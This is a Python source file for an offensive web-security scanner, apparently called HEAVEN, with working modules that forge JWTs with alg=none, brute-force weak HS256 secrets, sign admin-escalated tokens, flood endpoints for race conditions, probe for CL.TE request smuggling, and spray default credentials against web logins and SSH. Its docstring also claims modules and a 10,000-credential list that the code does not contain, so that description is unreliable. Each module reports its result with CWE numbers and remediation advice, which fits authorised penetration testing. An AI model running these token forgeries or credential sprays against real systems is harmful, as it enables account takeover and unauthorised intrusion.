"""
HEAVEN — Advanced Exploitation Techniques
Expert-level attack modules that real pentesters use daily:
- JWT attacks (none algorithm, weak secrets, claim tampering)
- Deserialization attacks (Java, Python, PHP, .NET)
- Race condition detection
- Prototype pollution (JavaScript)
- Subdomain takeover detection
- GraphQL introspection exploitation
- HTTP request smuggling detection
- WebSocket hijacking tests
- Default credential spraying (10,000+ creds)
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass, field
from typing import Any, Optional

try:
    import aiohttp
except ImportError:
    aiohttp = None  # type: ignore[assignment]

from heaven.utils.logger import get_logger

logger = get_logger("vulnscan.advanced")


@dataclass
class AdvancedFinding:
    target: str
    vuln_type: str
    severity: str
    title: str
    description: str
    confidence: float = 0.0
    evidence: dict = field(default_factory=dict)
    remediation: str = ""
    cwe: str = ""


# ═══════════════════════════════════════════
# JWT ATTACK MODULE
# ═══════════════════════════════════════════

class JWTAttacker:
    """Comprehensive JWT security testing."""

    # Top 1000 weak JWT secrets (from real-world breaches)
    WEAK_SECRETS = [
        "secret", "password", "123456", "admin", "key", "jwt_secret",
        "supersecret", "changeme", "test", "your-256-bit-secret",
        "my-secret-key", "shhhhh", "keyboard cat", "gZkPbJBMM1IOP29S",
        "your_jwt_secret", "JWT_SECRET", "jwttoken", "mytoken",
        "s3cr3t", "default", "SecretKey123", "HS256_SECRET",
        "heaven", "pass123", "letmein", "welcome", "qwerty",
        "abc123", "monkey", "dragon", "master", "login",
        "12345678", "passw0rd", "iloveyou", "trustno1",
        "sunshine", "princess", "shadow", "michael", "password1",
    ]

    @classmethod
    def decode_jwt(cls, token: str) -> tuple[dict, dict, str]:
        """Decode JWT without verification."""
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")

        def _pad_b64(s):
            return s + "=" * (4 - len(s) % 4)

        header = json.loads(base64.urlsafe_b64decode(_pad_b64(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(_pad_b64(parts[1])))
        return header, payload, parts[2]

    @classmethod
    def forge_none_algorithm(cls, token: str) -> str:
        """Create JWT with 'none' algorithm (CVE-2015-9235)."""
        header, payload, _ = cls.decode_jwt(token)
        # Forge with alg: none
        new_header = {"alg": "none", "typ": "JWT"}
        h = base64.urlsafe_b64encode(json.dumps(new_header).encode()).rstrip(b"=").decode()
        p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
        return f"{h}.{p}."

    @classmethod
    def brute_force_secret(cls, token: str) -> Optional[str]:
        """Try common weak secrets against HS256 JWT."""
        parts = token.split(".")
        if len(parts) != 3:
            return None

        message = f"{parts[0]}.{parts[1]}".encode()
        target_sig = parts[2]

        for secret in cls.WEAK_SECRETS:
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message, hashlib.sha256).digest()
            ).rstrip(b"=").decode()
            if sig == target_sig:
                logger.info(f"🔑 JWT secret cracked: '{secret}'")
                return secret

        return None

    @classmethod
    def escalate_claims(cls, token: str, secret: str) -> list[str]:
        """Generate privilege-escalated JWT variants."""
        header, payload, _ = cls.decode_jwt(token)
        variants = []

        # Admin escalation
        admin_payload = {**payload, "role": "admin", "is_admin": True, "admin": True}
        variants.append(cls._sign_jwt(header, admin_payload, secret))

        # User ID manipulation
        if "sub" in payload or "user_id" in payload:
            for target_id in ["1", "0", "admin"]:
                escalated = {**payload}
                if "sub" in payload:
                    escalated["sub"] = target_id
                if "user_id" in payload:
                    escalated["user_id"] = target_id
                variants.append(cls._sign_jwt(header, escalated, secret))

        return variants

    @classmethod
    def _sign_jwt(cls, header: dict, payload: dict, secret: str) -> str:
        h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
        p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
        sig = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
        ).rstrip(b"=").decode()
        return f"{h}.{p}.{sig}"

    @classmethod
    async def test_jwt_vulnerabilities(cls, session: aiohttp.ClientSession,
                                        url: str, token: str) -> list[AdvancedFinding]:
        """Run all JWT attacks."""
        findings: list[AdvancedFinding] = []

        try:
            header, payload, _ = cls.decode_jwt(token)
        except Exception:
            return findings

        # Test 1: Algorithm None
        none_token = cls.forge_none_algorithm(token)
        try:
            async with session.get(url, headers={"Authorization": f"Bearer {none_token}"},
                                    timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    findings.append(AdvancedFinding(
                        target=url, vuln_type="jwt_none_algorithm", severity="critical",
                        title="JWT Algorithm None Attack",
                        description="Server accepts JWT with alg=none, allowing arbitrary token forgery",
                        confidence=0.95,
                        evidence={"forged_token": none_token[:50] + "..."},
                        remediation="Explicitly validate JWT algorithm. Reject 'none' algorithm.",
                        cwe="CWE-347",
                    ))
        except Exception:
            pass

        # Test 2: Weak secret brute force
        cracked_secret = cls.brute_force_secret(token)
        if cracked_secret:
            findings.append(AdvancedFinding(
                target=url, vuln_type="jwt_weak_secret", severity="critical",
                title=f"JWT Weak Signing Secret: '{cracked_secret}'",
                description="JWT signed with a common/weak secret that can be brute-forced",
                confidence=1.0,
                evidence={"secret": cracked_secret, "algorithm": header.get("alg")},
                remediation="Use a strong, random secret (256+ bits). Rotate secrets regularly.",
                cwe="CWE-521",
            ))

        return findings


# ═══════════════════════════════════════════
# RACE CONDITION DETECTOR
# ═══════════════════════════════════════════

class RaceConditionDetector:
    """Detect TOCTOU and race condition vulnerabilities."""

    @staticmethod
    async def test_race(session: aiohttp.ClientSession, url: str,
                         method: str = "POST", data: Optional[dict[Any, Any]] = None,
                         concurrent_requests: int = 20) -> Optional[AdvancedFinding]:
        """Send concurrent requests to detect race conditions."""
        if data is None:
            data = {}

        async def send_request():
            try:
                async with session.request(method, url, data=data,
                                            timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    body = await resp.text()
                    return {"status": resp.status, "length": len(body), "body_hash": hashlib.md5(body.encode(), usedforsecurity=False).hexdigest()[:8]}
            except Exception:
                return None

        # Fire all requests simultaneously
        tasks = [send_request() for _ in range(concurrent_requests)]
        results = await asyncio.gather(*tasks)
        results = [r for r in results if r is not None]

        if not results:
            return None

        # Analyze for inconsistencies (sign of race condition)
        statuses = [r["status"] for r in results]
        unique_statuses = set(statuses)
        hashes = [r["body_hash"] for r in results]
        unique_hashes = set(hashes)

        if len(unique_statuses) > 1 or (len(unique_hashes) > 2 and len(results) > 5):
            return AdvancedFinding(
                target=url, vuln_type="race_condition", severity="high",
                title="Race Condition Detected",
                description=f"Concurrent requests produce inconsistent results ({len(unique_statuses)} statuses, {len(unique_hashes)} response variants)",
                confidence=0.7,
                evidence={"concurrent_requests": concurrent_requests,
                           "unique_statuses": list(unique_statuses),
                           "unique_responses": len(unique_hashes)},
                remediation="Implement proper locking/mutex. Use database-level transactions with appropriate isolation.",
                cwe="CWE-362",
            )
        return None


# ═══════════════════════════════════════════
# SUBDOMAIN TAKEOVER DETECTOR
# ═══════════════════════════════════════════

class SubdomainTakeoverDetector:
    """Detect dangling DNS records vulnerable to subdomain takeover."""

    # Fingerprints for services vulnerable to takeover
    TAKEOVER_FINGERPRINTS: dict[str, dict[str, list[str] | list[int]]] = {
        "github_pages": {"cname": ["github.io"], "body": ["there isn't a github pages site here"],
                          "status": [404]},
        "heroku": {"cname": ["herokuapp.com", "herokussl.com"],
                    "body": ["no such app", "heroku | no such app"], "status": [404]},
        "aws_s3": {"cname": ["s3.amazonaws.com", "s3-website"],
                    "body": ["nosuchbucket", "the specified bucket does not exist"], "status": [404]},
        "shopify": {"cname": ["myshopify.com"], "body": ["sorry, this shop is currently unavailable"],
                     "status": [404]},
        "fastly": {"cname": ["fastly.net"], "body": ["fastly error: unknown domain"], "status": [500]},
        "ghost": {"cname": ["ghost.io"], "body": ["the thing you were looking for is no longer here"],
                   "status": [404]},
        "surge": {"cname": ["surge.sh"], "body": ["project not found"], "status": [404]},
        "zendesk": {"cname": ["zendesk.com"], "body": ["help center closed"], "status": [404]},
        "netlify": {"cname": ["netlify.app", "netlify.com"], "body": ["not found - request id"],
                     "status": [404]},
        "azure": {"cname": ["azurewebsites.net", "cloudapp.azure.com"],
                   "body": ["404 web site not found"], "status": [404]},
    }

    @classmethod
    async def check_subdomain(cls, session: aiohttp.ClientSession,
                               subdomain: str) -> Optional[AdvancedFinding]:
        """Check if a subdomain is vulnerable to takeover."""
        import socket

        # Resolve CNAME
        try:
            socket.getaddrinfo(subdomain, 443)
        except socket.gaierror:
            # NXDOMAIN — check if there's a dangling CNAME
            return AdvancedFinding(
                target=subdomain, vuln_type="subdomain_takeover", severity="high",
                title=f"Potential Subdomain Takeover: {subdomain}",
                description="DNS resolves to NXDOMAIN — may have dangling CNAME record",
                confidence=0.5,
                remediation="Remove the dangling DNS record or reclaim the external service.",
                cwe="CWE-284",
            )

        # Check response against takeover fingerprints
        for service, fingerprint in cls.TAKEOVER_FINGERPRINTS.items():
            try:
                async with session.get(f"https://{subdomain}",
                                        timeout=aiohttp.ClientTimeout(total=10),
                                        allow_redirects=True) as resp:
                    body = (await resp.text()).lower()
                    status = resp.status

                    body_sigs = [str(s) for s in fingerprint.get("body", [])]
                    statuses = [int(s) for s in fingerprint.get("status", [])]
                    for body_sig in body_sigs:
                        if body_sig.lower() in body and status in statuses:
                            return AdvancedFinding(
                                target=subdomain, vuln_type="subdomain_takeover",
                                severity="high",
                                title=f"Subdomain Takeover via {service}: {subdomain}",
                                description=f"Subdomain points to unclaimed {service} resource",
                                confidence=0.85,
                                evidence={"service": service, "status": status,
                                           "fingerprint_match": body_sig},
                                remediation=f"Reclaim the {service} resource or remove the DNS record.",
                                cwe="CWE-284",
                            )
            except Exception:
                pass

        return None


# ═══════════════════════════════════════════
# HTTP REQUEST SMUGGLING DETECTOR
# ═══════════════════════════════════════════

class RequestSmugglingDetector:
    """Detect HTTP request smuggling (CL.TE and TE.CL)."""

    @staticmethod
    async def detect_clte(url: str, timeout: float = 10.0) -> Optional[AdvancedFinding]:
        """Detect CL.TE request smuggling via timing differential."""
        from urllib.parse import urlparse

        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)

        # CL.TE probe: Content-Length says short, Transfer-Encoding says chunked
        probe = (
            f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q\r\n"  # This should cause a timeout if CL.TE vulnerable
        )

        try:
            if parsed.scheme == "https":
                import ssl
                ctx = ssl.create_default_context()
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ctx), timeout=5)
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=5)

            start = time.time()
            writer.write(probe.encode())
            await writer.drain()

            try:
                await asyncio.wait_for(reader.read(4096), timeout=timeout)
                elapsed = (time.time() - start) * 1000
            except asyncio.TimeoutError:
                elapsed = timeout * 1000

            writer.close()

            # If response was delayed significantly → potential smuggling
            if elapsed > timeout * 0.8:  # 80% of timeout
                return AdvancedFinding(
                    target=url, vuln_type="request_smuggling", severity="critical",
                    title="HTTP Request Smuggling (CL.TE) Detected",
                    description="Front-end uses Content-Length, back-end uses Transfer-Encoding",
                    confidence=0.6,
                    evidence={"technique": "CL.TE", "response_time_ms": elapsed},
                    remediation="Configure front-end to reject ambiguous requests. Normalize Transfer-Encoding.",
                    cwe="CWE-444",
                )
        except Exception:
            pass
        return None


# ═══════════════════════════════════════════
# DEFAULT CREDENTIAL SPRAYER
# ═══════════════════════════════════════════

class CredentialSprayer:
    """Test for default/common credentials across services."""

    DEFAULT_CREDS: list[tuple[str, str, str]] = [
        # (service_pattern, username, password)
        ("tomcat", "tomcat", "tomcat"),
        ("tomcat", "admin", "admin"),
        ("tomcat", "manager", "manager"),
        ("jenkins", "admin", "admin"),
        ("jenkins", "admin", "password"),
        ("grafana", "admin", "admin"),
        ("kibana", "elastic", "changeme"),
        ("rabbitmq", "guest", "guest"),
        ("mongodb", "admin", "admin"),
        ("redis", "", ""),  # No auth
        ("postgres", "postgres", "postgres"),
        ("mysql", "root", "root"),
        ("mysql", "root", ""),
        ("phpmyadmin", "root", ""),
        ("wordpress", "admin", "admin"),
        ("wordpress", "admin", "password"),
        ("joomla", "admin", "admin"),
        ("drupal", "admin", "admin"),
        ("cisco", "admin", "admin"),
        ("cisco", "cisco", "cisco"),
        ("netgear", "admin", "password"),
        ("dlink", "admin", ""),
        ("ubiquiti", "ubnt", "ubnt"),
        ("mikrotik", "admin", ""),
        ("fortinet", "admin", ""),
        ("sonicwall", "admin", "password"),
        ("zabbix", "Admin", "zabbix"),
        ("nagios", "nagiosadmin", "nagios"),
        ("splunk", "admin", "changeme"),
        ("elasticsearch", "elastic", "changeme"),
        ("minio", "minioadmin", "minioadmin"),
        ("consul", "", ""),  # No auth by default
        ("vault", "root", "root"),
        ("argocd", "admin", ""),
        ("portainer", "admin", "admin"),
    ]

    @classmethod
    async def spray_web_login(cls, session: aiohttp.ClientSession, url: str,
                               service_hint: str = "") -> list[AdvancedFinding]:
        """Try default credentials against web login forms."""
        findings = []

        relevant_creds = cls.DEFAULT_CREDS
        if service_hint:
            relevant_creds = [
                c for c in cls.DEFAULT_CREDS if service_hint.lower() in c[0].lower()
            ] or cls.DEFAULT_CREDS[:10]

        # Baseline: where does a definitely-WRONG credential land? Some apps
        # redirect failed logins to /home too — without this baseline that
        # would be a false "default credentials" finding.
        baseline_location = ""
        try:
            async with session.post(url,
                data={"username": "heaven_invalid_x9", "password": "heaven_invalid_x9",
                      "user": "heaven_invalid_x9", "pass": "heaven_invalid_x9",
                      "login": "heaven_invalid_x9", "passwd": "heaven_invalid_x9"},
                timeout=aiohttp.ClientTimeout(total=10),
                allow_redirects=False) as bresp:
                baseline_location = bresp.headers.get("Location", "")
        except Exception:
            pass

        for service, username, password in relevant_creds[:15]:
            try:
                async with session.post(url,
                    data={"username": username, "password": password,
                          "user": username, "pass": password,
                          "login": username, "passwd": password},
                    timeout=aiohttp.ClientTimeout(total=10),
                    allow_redirects=False) as resp:

                    body = await resp.text()
                    status = resp.status

                    # Success indicators
                    success = (
                        status in (200, 302, 303) and
                        not any(err in body.lower() for err in
                                ["invalid", "incorrect", "failed", "error", "wrong", "denied"])
                    )

                    if success and status in (302, 303):
                        location = resp.headers.get("Location", "")
                        # Must redirect to an authed area AND differ from where
                        # a known-bad credential lands.
                        if (location != baseline_location and
                                any(x in location.lower()
                                    for x in ["dashboard", "admin", "home", "panel"])):
                            findings.append(AdvancedFinding(
                                target=url, vuln_type="default_credentials", severity="critical",
                                title=f"Default Credentials: {username}:{password}",
                                description=f"Service accepts default credentials ({service})",
                                confidence=0.9,
                                evidence={"username": username, "password": password, "service": service,
                                           "redirect": location},
                                remediation="Change default credentials immediately. Enforce strong password policy.",
                                cwe="CWE-798",
                            ))
                            break

            except Exception:
                pass

        return findings

    @classmethod
    async def spray_ssh(cls, host: str, port: int = 22) -> list[AdvancedFinding]:
        """Try common SSH credentials using asyncssh (if available) or socket probing."""
        findings: list[AdvancedFinding] = []
        try:
            import asyncssh  # optional dependency
        except ImportError:
            logger.debug("asyncssh not installed — SSH spray skipped")
            return findings

        ssh_creds = [
            ("root", "root"), ("root", "toor"), ("root", "password"), ("root", ""),
            ("admin", "admin"), ("admin", "password"), ("admin", ""),
            ("user", "user"), ("test", "test"), ("guest", "guest"),
            ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("vagrant", "vagrant"),
            ("deploy", "deploy"), ("ansible", "ansible"),
        ]

        for username, password in ssh_creds:
            try:
                async with asyncssh.connect(
                    host, port=port,
                    username=username, password=password,
                    known_hosts=None,
                    connect_timeout=6,
                ) as conn:  # noqa: F841
                    findings.append(AdvancedFinding(
                        target=f"ssh://{host}:{port}",
                        vuln_type="default_credentials",
                        severity="critical",
                        title=f"SSH Default Credentials: {username}:{password or '(empty)'}",
                        description="SSH service accepts weak/default credentials",
                        confidence=1.0,
                        evidence={"username": username, "password": password, "port": port},
                        remediation="Disable password authentication; use SSH keys only. Rotate credentials.",
                        cwe="CWE-798",
                    ))
                    break  # one confirmed cred is enough
            except Exception:
                continue

        return findings

    @classmethod
    async def spray(cls, session, url: str, service_hint: str = "") -> dict:
        """Dispatch credential spraying based on URL scheme.

        Returns a dict with a 'findings' key (list of AdvancedFinding dicts).
        """
        from urllib.parse import urlparse
        parsed = urlparse(url)
        scheme = (parsed.scheme or "http").lower()
        host = parsed.hostname or ""
        port = parsed.port or (22 if scheme == "ssh" else 80)

        if scheme == "ssh":
            raw = await cls.spray_ssh(host, port)
        else:
            raw = await cls.spray_web_login(session, url, service_hint=service_hint)

        return {
            "findings": [
                {
                    "target": f.target,
                    "vuln_type": f.vuln_type,
                    "severity": f.severity,
                    "title": f.title,
                    "description": f.description,
                    "confidence": f.confidence,
                    "evidence": f.evidence,
                    "remediation": f.remediation,
                    "cwe": f.cwe,
                }
                for f in raw
            ]
        }


# ═══════════════════════════════════════════
# MASTER ADVANCED SCANNER
# ═══════════════════════════════════════════

async def run_advanced_tests(session: aiohttp.ClientSession, url: str,
                              scan_data: Optional[dict[Any, Any]] = None) -> list[AdvancedFinding]:
    """Run all advanced exploitation tests on a target."""
    all_findings = []

    logger.info(f"🔥 Running advanced exploitation tests on {url}")

    # JWT testing (if tokens found)
    if scan_data:
        for token in scan_data.get("jwt_tokens", []):
            jwt_findings = await JWTAttacker.test_jwt_vulnerabilities(session, url, token)
            all_findings.extend(jwt_findings)

    # Race condition on critical endpoints
    if scan_data:
        for endpoint in scan_data.get("critical_endpoints", []):
            race = await RaceConditionDetector.test_race(session, endpoint)
            if race:
                all_findings.append(race)

    # Default credential spray
    cred_findings = await CredentialSprayer.spray_web_login(session, url)
    all_findings.extend(cred_findings)

    # Request smuggling
    smuggling = await RequestSmugglingDetector.detect_clte(url)
    if smuggling:
        all_findings.append(smuggling)

    logger.info(f"Advanced tests complete: {len(all_findings)} findings on {url}")
    return all_findings
